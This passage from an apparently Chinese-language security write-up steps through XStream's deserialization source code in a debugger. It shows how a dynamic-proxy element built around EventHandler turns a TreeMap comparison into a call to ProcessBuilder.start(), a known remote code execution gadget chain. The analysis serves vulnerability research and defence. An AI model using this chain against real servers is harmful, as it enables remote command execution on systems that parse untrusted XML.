        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="o">(</span><span class="n">CannotResolveClassException</span><span class="o">)</span><span class="n">cached</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="c1">// 调用父类的realClass继续解析</span>
            <span class="n">Class</span> <span class="n">result</span> <span class="o">=</span> <span class="kd">super</span><span class="o">.</span><span class="na">realClass</span><span class="o">(</span><span class="n">elementName</span><span class="o">);</span>
            <span class="c1">// 并将其存放至realClassCache</span>
            <span class="k">this</span><span class="o">.</span><span class="na">realClassCache</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">elementName</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
            <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">CannotResolveClassException</span> <span class="n">var4</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">realClassCache</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">elementName</span><span class="o">,</span> <span class="n">var4</span><span class="o">);</span>
            <span class="k">throw</span> <span class="n">var4</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>得到了根元素的class，返回至TreeUnmarshaller的start函数，这时来到了下面这条语句</p>
<div class="highlight"><pre><span></span><span class="n">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">convertAnother</span><span class="o">((</span><span class="n">Object</span><span class="o">)</span><span class="kc">null</span><span class="o">,</span> <span class="n">type</span><span class="o">);</span>
</pre></div>
<p>此时的type正是上面获取的class：java.util.SortedSet<br/>
进入TreeUnmarshaller的convertAnother函数</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Object</span> <span class="nf">convertAnother</span><span class="o">(</span><span class="n">Object</span> <span class="n">parent</span><span class="o">,</span> <span class="n">Class</span> <span class="n">type</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">convertAnother</span><span class="o">(</span><span class="n">parent</span><span class="o">,</span> <span class="n">type</span><span class="o">,</span> <span class="o">(</span><span class="n">Converter</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>转换成3个参数的convertAnother函数</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Object</span> <span class="nf">convertAnother</span><span class="o">(</span><span class="n">Object</span> <span class="n">parent</span><span class="o">,</span> <span class="n">Class</span> <span class="n">type</span><span class="o">,</span> <span class="n">Converter</span> <span class="n">converter</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">type</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">mapper</span><span class="o">.</span><span class="na">defaultImplementationOf</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">converter</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// 根据type获取对应的converter</span>
        <span class="n">converter</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">converterLookup</span><span class="o">.</span><span class="na">lookupConverterForType</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(!</span><span class="n">converter</span><span class="o">.</span><span class="na">canConvert</span><span class="o">(</span><span class="n">type</span><span class="o">))</span> <span class="o">{</span>
        <span class="n">ConversionException</span> <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConversionException</span><span class="o">(</span><span class="s">"Explicit selected converter cannot handle type"</span><span class="o">);</span>
        <span class="n">e</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"item-type"</span><span class="o">,</span> <span class="n">type</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
        <span class="n">e</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"converter-type"</span><span class="o">,</span> <span class="n">converter</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
        <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="c1">// 然后将type转换成对应的object</span>
    <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">convert</span><span class="o">(</span><span class="n">parent</span><span class="o">,</span> <span class="n">type</span><span class="o">,</span> <span class="n">converter</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>这里的converter是TreeSetConverter转换器，其中lookupConverterForType函数在上面分析过<br/>
接下来进入到AbstractReferenceUnmarshaller.class的convert函数</p>
<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="n">Object</span> <span class="nf">convert</span><span class="o">(</span><span class="n">Object</span> <span class="n">parent</span><span class="o">,</span> <span class="n">Class</span> <span class="n">type</span><span class="o">,</span> <span class="n">Converter</span> <span class="n">converter</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Object</span> <span class="n">result</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">parentStack</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">result</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">parentStack</span><span class="o">.</span><span class="na">peek</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">result</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">this</span><span class="o">.</span><span class="na">values</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">result</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">values</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">result</span><span class="o">,</span> <span class="n">parent</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="c1">// 从mapper中获取reference别名</span>
    <span class="n">String</span> <span class="n">attributeName</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getMapper</span><span class="o">().</span><span class="na">aliasForSystemAttribute</span><span class="o">(</span><span class="s">"reference"</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">reference</span> <span class="o">=</span> <span class="n">attributeName</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="kc">null</span> <span class="o">:</span> <span class="k">this</span><span class="o">.</span><span class="na">reader</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">attributeName</span><span class="o">);</span>
    <span class="n">Object</span> <span class="n">cache</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">reference</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">cache</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">values</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getReferenceKey</span><span class="o">(</span><span class="n">reference</span><span class="o">));</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">cache</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">ConversionException</span> <span class="n">ex</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConversionException</span><span class="o">(</span><span class="s">"Invalid reference"</span><span class="o">);</span>
            <span class="n">ex</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"reference"</span><span class="o">,</span> <span class="n">reference</span><span class="o">);</span>
            <span class="k">throw</span> <span class="n">ex</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="n">result</span> <span class="o">=</span> <span class="n">cache</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">?</span> <span class="kc">null</span> <span class="o">:</span> <span class="n">cache</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="c1">// 获取当前标签</span>
        <span class="n">cache</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getCurrentReferenceKey</span><span class="o">();</span>
        <span class="c1">// 并将其压入栈中</span>
        <span class="k">this</span><span class="o">.</span><span class="na">parentStack</span><span class="o">.</span><span class="na">push</span><span class="o">(</span><span class="n">cache</span><span class="o">);</span>
        <span class="c1">// 然后调用父类的convert方法</span>
        <span class="n">result</span> <span class="o">=</span> <span class="kd">super</span><span class="o">.</span><span class="na">convert</span><span class="o">(</span><span class="n">parent</span><span class="o">,</span> <span class="n">type</span><span class="o">,</span> <span class="n">converter</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">cache</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">values</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">cache</span><span class="o">,</span> <span class="n">result</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">NULL</span> <span class="o">:</span> <span class="n">result</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="k">this</span><span class="o">.</span><span class="na">parentStack</span><span class="o">.</span><span class="na">popSilently</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>查看TreeUnmarshaller的convert方法</p>
<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="n">Object</span> <span class="nf">convert</span><span class="o">(</span><span class="n">Object</span> <span class="n">parent</span><span class="o">,</span> <span class="n">Class</span> <span class="n">type</span><span class="o">,</span> <span class="n">Converter</span> <span class="n">converter</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="c1">// </span>
        <span class="k">this</span><span class="o">.</span><span class="na">types</span><span class="o">.</span><span class="na">push</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="n">converter</span><span class="o">.</span><span class="na">unmarshal</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">reader</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">types</span><span class="o">.</span><span class="na">popSilently</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ConversionException</span> <span class="n">var6</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">addInformationTo</span><span class="o">(</span><span class="n">var6</span><span class="o">,</span> <span class="n">type</span><span class="o">,</span> <span class="n">converter</span><span class="o">,</span> <span class="n">parent</span><span class="o">);</span>
        <span class="k">throw</span> <span class="n">var6</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">var7</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">ConversionException</span> <span class="n">conversionException</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConversionException</span><span class="o">(</span><span class="n">var7</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">addInformationTo</span><span class="o">(</span><span class="n">conversionException</span><span class="o">,</span> <span class="n">type</span><span class="o">,</span> <span class="n">converter</span><span class="o">,</span> <span class="n">parent</span><span class="o">);</span>
        <span class="k">throw</span> <span class="n">conversionException</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>前面得到了converter是TreeSetConverter转换器，现在调用其unmarshal方法，进入该方法，最终会到下面这句代码</p>
<div class="highlight"><pre><span></span><span class="k">this</span><span class="o">.</span><span class="na">treeMapConverter</span><span class="o">.</span><span class="na">populateTreeMap</span><span class="o">(</span><span class="n">reader</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">treeMap</span><span class="o">,</span> <span class="n">unmarshalledComparator</span><span class="o">);</span>
</pre></div>
<p>进入该函数</p>
<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">populateTreeMap</span><span class="o">(</span><span class="n">HierarchicalStreamReader</span> <span class="n">reader</span><span class="o">,</span> <span class="n">UnmarshallingContext</span> <span class="n">context</span><span class="o">,</span> <span class="n">TreeMap</span> <span class="n">result</span><span class="o">,</span> <span class="n">Comparator</span> <span class="n">comparator</span><span class="o">)</span> <span class="o">{</span>
    <span class="kt">boolean</span> <span class="n">inFirstElement</span> <span class="o">=</span> <span class="n">comparator</span> <span class="o">==</span> <span class="n">NULL_MARKER</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">inFirstElement</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">comparator</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="n">SortedMap</span> <span class="n">sortedMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PresortedMap</span><span class="o">(</span><span class="n">comparator</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">JVM</span><span class="o">.</span><span class="na">hasOptimizedTreeMapPutAll</span><span class="o">()</span> <span class="o">?</span> <span class="n">comparator</span> <span class="o">:</span> <span class="kc">null</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">inFirstElement</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// 将当前的内容存入Map中</span>
        <span class="k">this</span><span class="o">.</span><span class="na">putCurrentEntryIntoMap</span><span class="o">(</span><span class="n">reader</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">result</span><span class="o">,</span> <span class="n">sortedMap</span><span class="o">);</span>
        <span class="n">reader</span><span class="o">.</span><span class="na">moveUp</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="k">this</span><span class="o">.</span><span class="na">populateMap</span><span class="o">(</span><span class="n">reader</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">result</span><span class="o">,</span> <span class="n">sortedMap</span><span class="o">);</span>
    <span class="o">...</span>
<span class="o">}</span>
</pre></div>
<p>进入putCurrentEntryIntoMap方法</p>
<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">putCurrentEntryIntoMap</span><span class="o">(</span><span class="n">HierarchicalStreamReader</span> <span class="n">reader</span><span class="o">,</span> <span class="n">UnmarshallingContext</span> <span class="n">context</span><span class="o">,</span> <span class="n">Map</span> <span class="n">map</span><span class="o">,</span> <span class="n">Map</span> <span class="n">target</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// 读取标签的内容并将其放入target这个Map中</span>
    <span class="n">Object</span> <span class="n">key</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">readItem</span><span class="o">(</span><span class="n">reader</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
    <span class="n">target</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">key</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>一直跟进，在CachingMapper.class的realClass中会获得里面嵌套的标签\&lt;String&gt;，获取到后会将该标签的值foo存入target中，继续单步获取内嵌的下一个标签<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814212214-956cb7e4-3aa5-1.png"/><br/>
进入该函数，单步执行，一直跟着标签名寻找对应的类<br/>
最后在com\thoughtworks\xstream\mapper\DynamicProxyMapper.class的realClass方法中</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Class</span> <span class="nf">realClass</span><span class="o">(</span><span class="n">String</span> <span class="n">elementName</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="n">elementName</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">alias</span><span class="o">)</span> <span class="o">?</span> <span class="n">DynamicProxy</span><span class="o">.</span><span class="na">class</span> <span class="o">:</span> <span class="kd">super</span><span class="o">.</span><span class="na">realClass</span><span class="o">(</span><span class="n">elementName</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>这里的this.alias就是dynamic-proxy，这里相等即返回DynamicProxy.class<br/>
F8一直返回到AbstractCollectionConverter的readItem方法，执行下一条语句，进入convertAnother方法，一直到TreeUnmarshaller的convertAnother方法，这里会得到converter为DynamicProxyConverter<br/>
又是同样的流程解析dynamic-proxy里面的标签内容<br/>
模仿上面的流程来到DynamicProxyConverter.class中的unmarshal函数</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Object</span> <span class="nf">unmarshal</span><span class="o">(</span><span class="n">HierarchicalStreamReader</span> <span class="n">reader</span><span class="o">,</span> <span class="n">UnmarshallingContext</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">List</span> <span class="n">interfaces</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">();</span>
    <span class="n">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

    <span class="c1">// 解析dynamic-proxy里的interface和handler</span>
    <span class="n">Class</span> <span class="n">handlerType</span><span class="o">;</span>
    <span class="k">for</span><span class="o">(</span><span class="n">handlerType</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span> <span class="n">reader</span><span class="o">.</span><span class="na">hasMoreChildren</span><span class="o">();</span> <span class="n">reader</span><span class="o">.</span><span class="na">moveUp</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">reader</span><span class="o">.</span><span class="na">moveDown</span><span class="o">();</span>
        <span class="n">String</span> <span class="n">elementName</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">getNodeName</span><span class="o">();</span>
        <span class="c1">// 匹配interface</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">elementName</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"interface"</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">interfaces</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">mapper</span><span class="o">.</span><span class="na">realClass</span><span class="o">(</span><span class="n">reader</span><span class="o">.</span><span class="na">getValue</span><span class="o">()));</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">elementName</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"handler"</span><span class="o">))</span> <span class="o">{</span>
            <span class="c1">// 匹配handler</span>
            <span class="n">String</span> <span class="n">attributeName</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">mapper</span><span class="o">.</span><span class="na">aliasForSystemAttribute</span><span class="o">(</span><span class="s">"class"</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">attributeName</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">handlerType</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">mapper</span><span class="o">.</span><span class="na">realClass</span><span class="o">(</span><span class="n">reader</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">attributeName</span><span class="o">));</span>
                <span class="k">break</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="k">if</span> <span class="o">(</span><span class="n">handlerType</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">ConversionException</span><span class="o">(</span><span class="s">"No InvocationHandler specified for dynamic proxy"</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="n">Class</span><span class="o">[]</span> <span class="n">interfacesAsArray</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="n">interfaces</span><span class="o">.</span><span class="na">size</span><span class="o">()];</span>
        <span class="n">interfaces</span><span class="o">.</span><span class="na">toArray</span><span class="o">(</span><span class="n">interfacesAsArray</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">proxy</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">HANDLER</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">proxy</span> <span class="o">=</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">classLoaderReference</span><span class="o">.</span><span class="na">getReference</span><span class="o">(),</span> <span class="n">interfacesAsArray</span><span class="o">,</span> <span class="n">DUMMY</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="c1">// 解析handler标签下的东西，解析流程和上面一致</span>
        <span class="n">handler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span><span class="n">context</span><span class="o">.</span><span class="na">convertAnother</span><span class="o">(</span><span class="n">proxy</span><span class="o">,</span> <span class="n">handlerType</span><span class="o">);</span>
        <span class="n">reader</span><span class="o">.</span><span class="na">moveUp</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">HANDLER</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">Fields</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">HANDLER</span><span class="o">,</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">handler</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">proxy</span> <span class="o">=</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">classLoaderReference</span><span class="o">.</span><span class="na">getReference</span><span class="o">(),</span> <span class="n">interfacesAsArray</span><span class="o">,</span> <span class="n">handler</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">proxy</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>执行到最后的return，结果如下：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814212253-acbb5144-3aa5-1.png"/><br/>
然后又一直return，回到TreeMapConverter的populateTreeMap函数<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814212321-bd56170a-3aa5-1.png"/><br/>
这里的result是TreeMap<br/>
接着进入TreeMap的putAll函数，然后调用父类(Abstract)的putAll，接着又来到TreeMap的put方法，此时的k是代理类，它代理的是EventHandler类<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814212349-ce3d54fc-3aa5-1.png"/><br/>
执行到这里的时候会通过EventHandler的invoke方法调用compareTo方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="kd">final</span> <span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">arguments</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">AccessControlContext</span> <span class="n">acc</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">acc</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">((</span><span class="n">acc</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getSecurityManager</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">SecurityException</span><span class="o">(</span><span class="s">"AccessControlContext is not set"</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">AccessController</span><span class="o">.</span><span class="na">doPrivileged</span><span class="o">(</span><span class="k">new</span> <span class="n">PrivilegedAction</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;()</span> <span class="o">{</span>
        <span class="c1">// 会执行这里</span>
        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">invokeInternal</span><span class="o">(</span><span class="n">proxy</span><span class="o">,</span> <span class="n">method</span><span class="o">,</span> <span class="n">arguments</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">},</span> <span class="n">acc</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>会继续执行至invokeInternal函数,直到下面这行代码<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814212441-ed1af7d0-3aa5-1.png"/><br/>
这里的targetMethod方法正是java.lang.ProcessBuilder.start(),而这里的targetMethod方法是从上面的代码获取来的</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">(</span><span class="n">targetMethod</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">targetMethod</span> <span class="o">=</span> <span class="n">Statement</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span>
                <span class="s">"set"</span> <span class="o">+</span> <span class="n">NameGenerator</span><span class="o">.</span><span class="na">capitalize</span><span class="o">(</span><span class="n">action</span><span class="o">),</span> <span class="n">argTypes</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>函数调用栈</p>
<div class="highlight"><pre><span></span><span class="nl">invokeInternal:</span><span class="mi">482</span><span class="o">,</span> <span class="n">EventHandler</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">beans</span><span class="o">)</span>
<span class="nl">access$000:</span><span class="mi">279</span><span class="o">,</span> <span class="n">EventHandler</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">beans</span><span class="o">)</span>
<span class="nl">run:</span><span class="mi">430</span><span class="o">,</span> <span class="n">EventHandler$1</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">beans</span><span class="o">)</span>
<span class="nl">doPrivileged:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">AccessController</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">security</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">428</span><span class="o">,</span> <span class="n">EventHandler</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">beans</span><span class="o">)</span>
<span class="nl">compareTo:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">$Proxy0</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">proxy</span><span class="o">)</span>
<span class="nl">put:</span><span class="mi">568</span><span class="o">,</span> <span class="n">TreeMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">putAll:</span><span class="mi">281</span><span class="o">,</span> <span class="n">AbstractMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">putAll:</span><span class="mi">327</span><span class="o">,</span> <span class="n">TreeMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">populateTreeMap:</span><span class="mi">122</span><span class="o">,</span> <span class="n">TreeMapConverter</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">converters</span><span class="o">.</span><span class="na">collections</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">94</span><span class="o">,</span> <span class="n">TreeSetConverter</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">converters</span><span class="o">.</span><span class="na">collections</span><span class="o">)</span>
<span class="nl">convert:</span><span class="mi">72</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convert:</span><span class="mi">65</span><span class="o">,</span> <span class="n">AbstractReferenceUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convertAnother:</span><span class="mi">66</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convertAnother:</span><span class="mi">50</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">start:</span><span class="mi">134</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
